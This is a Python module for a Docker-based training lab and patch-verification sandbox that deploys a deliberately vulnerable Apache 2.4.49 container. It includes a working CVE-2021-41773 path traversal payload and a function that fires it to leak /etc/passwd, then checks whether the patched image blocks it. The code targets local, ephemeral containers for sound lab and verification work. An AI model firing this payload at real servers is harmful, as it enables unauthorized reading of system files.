# Shared Docker "box" engine.
# Powers HTB-style labs (manual deploy/destroy) and, later, SentinelAI's automated
# exploit/patch verification. Boxes are ephemeral, single-asset containers.

import http.client
import logging
import time
import uuid
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

_SANDBOX_DATA = Path(__file__).resolve().parent.parent / "data" / "sandbox"

CONTAINER_LABEL = "sentinel.managed"
CONTAINER_PREFIX = "sentinel-lab-"


# Registry of deployable boxes. Each box is one vulnerable asset a user can attack.
BOX_REGISTRY: dict[str, dict] = {
    "apache-2449": {
        "name": "Apache Traversal",
        "description": (
            "Apache HTTP Server 2.4.49 with a permissive filesystem config. "
            "Vulnerable to CVE-2021-41773 path traversal / file disclosure."
        ),
        "cve_id": "CVE-2021-41773",
        "image": "httpd:2.4.49",
        "patched_image": "httpd:2.4.51",  # upstream fix, used by verify_cve
        "container_port": 80,
        "config_mount": {
            "host_path": str((_SANDBOX_DATA / "httpd-vuln.conf").as_posix()),
            "container_path": "/usr/local/apache2/conf/httpd.conf",
        },
        "hint": "Try a URL-encoded path traversal through an aliased directory (e.g. /icons/).",
    },
}

# Path traversal payload for CVE-2021-41773 (URL-encoded, must not be normalized).
_APACHE_TRAVERSAL_PATH = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


class BoxError(Exception):
    """Raised when a box cannot be deployed or destroyed."""


_docker_client = None


def _get_docker():
    """Lazily create and cache the Docker client. Raises BoxError if unreachable."""
    global _docker_client
    if _docker_client is None:
        try:
            import docker

            _docker_client = docker.from_env()
            _docker_client.ping()
        except Exception as e:
            logger.error(f"Docker daemon unreachable: {e}")
            raise BoxError("Docker daemon is not reachable. Is Docker running?") from e
    return _docker_client


def list_boxes() -> list[dict]:
    """Return the catalog of deployable boxes (metadata only, no secrets)."""
    return [
        {
            "box_id": box_id,
            "name": box["name"],
            "description": box["description"],
            "cve_id": box["cve_id"],
            "hint": box["hint"],
        }
        for box_id, box in BOX_REGISTRY.items()
    ]


def _instance_payload(container, box_id: str, instance_id: str) -> dict:
    container.reload()
    box = BOX_REGISTRY[box_id]
    port_key = f"{box['container_port']}/tcp"
    bindings = container.ports.get(port_key) or []
    host_port = int(bindings[0]["HostPort"]) if bindings else None
    return {
        "instance_id": instance_id,
        "box_id": box_id,
        "box_name": box["name"],
        "status": container.status,
        "host": "localhost",
        "port": host_port,
        "connection": f"http://localhost:{host_port}" if host_port else None,
        "hint": box["hint"],
    }


def _start_container(box_id: str, instance_id: str, image: Optional[str] = None):
    """Start one ephemeral labelled container for a box. `image` overrides the box default."""
    box = BOX_REGISTRY[box_id]
    client = _get_docker()

    volumes = {
        box["config_mount"]["host_path"]: {
            "bind": box["config_mount"]["container_path"],
            "mode": "ro",
        }
    } if box.get("config_mount") else None

    try:
        return client.containers.run(
            image or box["image"],
            name=f"{CONTAINER_PREFIX}{instance_id}",
            detach=True,
            ports={f"{box['container_port']}/tcp": None},  # Docker picks a free host port
            volumes=volumes,
            labels={
                CONTAINER_LABEL: "true",
                "sentinel.box_id": box_id,
                "sentinel.instance_id": instance_id,
            },
        )
    except Exception as e:
        logger.error(f"Failed to start container for box {box_id}: {e}")
        raise BoxError(f"Failed to deploy box: {e}") from e


def deploy_box(box_id: str) -> dict:
    """Spin up an ephemeral container for the given box and return connection info."""
    if box_id not in BOX_REGISTRY:
        raise BoxError(f"Unknown box_id: {box_id}")

    instance_id = str(uuid.uuid4())
    container = _start_container(box_id, instance_id)
    return _instance_payload(container, box_id, instance_id)


def _find_container(instance_id: str):
    client = _get_docker()
    matches = client.containers.list(
        all=True, filters={"label": f"sentinel.instance_id={instance_id}"}
    )
    return matches[0] if matches else None


def destroy_instance(instance_id: str) -> bool:
    """Force-remove the container for an instance. Returns True if one was removed."""
    container = _find_container(instance_id)
    if container is None:
        return False
    try:
        container.remove(force=True)
    except Exception as e:
        logger.error(f"Failed to destroy instance {instance_id}: {e}")
        raise BoxError(f"Failed to destroy instance: {e}") from e
    return True


def list_instances() -> list[dict]:
    """List all running/stopped boxes this platform manages."""
    client = _get_docker()
    containers = client.containers.list(all=True, filters={"label": f"{CONTAINER_LABEL}=true"})
    instances = []
    for container in containers:
        box_id = container.labels.get("sentinel.box_id", "")
        instance_id = container.labels.get("sentinel.instance_id", "")
        if box_id in BOX_REGISTRY:
            instances.append(_instance_payload(container, box_id, instance_id))
    return instances


# --- Automated exploit / patch verification (SentinelAI Micro-Sandbox) ---------------

def _wait_for_http(host: str, port: int, timeout: float = 15.0) -> bool:
    """Poll the container's HTTP port until it responds or timeout elapses."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            conn = http.client.HTTPConnection(host, port, timeout=2)
            conn.request("GET", "/")
            conn.getresponse().read()
            conn.close()
            return True
        except Exception:
            time.sleep(0.5)
    return False


def _exploit_apache_traversal(host: str, port: int) -> tuple[bool, str]:
    """Fire the CVE-2021-41773 traversal. Success = /etc/passwd contents leak."""
    try:
        conn = http.client.HTTPConnection(host, port, timeout=5)
        conn.request("GET", _APACHE_TRAVERSAL_PATH)
        resp = conn.getresponse()
        body = resp.read().decode(errors="replace")
        conn.close()
    except Exception as e:
        return False, f"exploit request failed: {e}"

    success = resp.status == 200 and "root:" in body
    detail = "leaked /etc/passwd" if success else f"blocked (HTTP {resp.status})"
    return success, f"traversal → {detail}"


# cve_id -> exploit handler. Only CVEs with a real, scriptable PoC are registered.
POC_HANDLERS = {
    "CVE-2021-41773": {"box_id": "apache-2449", "exploit": _exploit_apache_traversal},
}


def _run_exploit_round(box_id: str, image: str, exploit, logs: list[str], label: str) -> bool:
    """Deploy one container on `image`, wait, run the exploit, tear down. Returns success."""
    instance_id = str(uuid.uuid4())
    container = None
    try:
        container = _start_container(box_id, instance_id, image=image)
        payload = _instance_payload(container, box_id, instance_id)
        port = payload["port"]
        if not port or not _wait_for_http("localhost", port):
            logs.append(f"[{label}] {image}: container did not become ready")
            return False
        success, detail = exploit("localhost", port)
        logs.append(f"[{label}] {image}: {detail}")
        return success
    finally:
        if container is not None:
            try:
                container.remove(force=True)
            except Exception as e:
                logs.append(f"[{label}] cleanup warning: {e}")


def verify_cve(cve_id: str) -> dict:
    """Detonate the exploit on the vulnerable image, then on the patched image, and
    report whether the patch blocks it. Containers are always torn down."""
    logs: list[str] = []

    handler = POC_HANDLERS.get(cve_id)
    if handler is None:
        logs.append(f"No automated sandbox test available for {cve_id}.")
        return {
            "cve_id": cve_id,
            "before_exploit_success": False,
            "after_exploit_success": False,
            "patch_verified": False,
            "logs": logs,
        }

    box_id = handler["box_id"]
    box = BOX_REGISTRY[box_id]
    exploit = handler["exploit"]

    try:
        before = _run_exploit_round(box_id, box["image"], exploit, logs, "before")
        after = _run_exploit_round(box_id, box["patched_image"], exploit, logs, "after")
    except BoxError as e:
        logs.append(f"Sandbox error: {e}")
        return {
            "cve_id": cve_id,
            "before_exploit_success": False,
            "after_exploit_success": False,
            "patch_verified": False,
            "logs": logs,
        }

    patch_verified = before and not after
    logs.append(f"patch_verified = {patch_verified}")
    return {
        "cve_id": cve_id,
        "before_exploit_success": before,
        "after_exploit_success": after,
        "patch_verified": patch_verified,
        "logs": logs,
    }
